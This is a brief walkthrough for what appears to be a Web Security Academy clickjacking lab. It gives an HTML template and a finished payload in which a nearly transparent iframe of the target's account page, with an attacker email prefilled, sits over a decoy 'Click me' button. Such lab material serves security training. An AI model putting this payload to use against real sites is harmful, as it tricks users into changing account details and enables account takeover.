

1. Insert the following HTML into the exploit server

```html
<style> iframe { position:relative; width:$width_value; height: $height_value; opacity: $opacity; z-index: 2; } div { position:absolute; top:$top_value; left:$side_value; z-index: 1; } </style> <div>Test me</div> <iframe src="https://0a8200aa03d7f7c8801d6c7800ce00c2.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>


```


2. Payload

```html
<style>
    iframe {
        position:relative;
        width:1000;
        height: 700;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:515px;
        left:60px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a8200aa03d7f7c8801d6c7800ce00c2.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>

```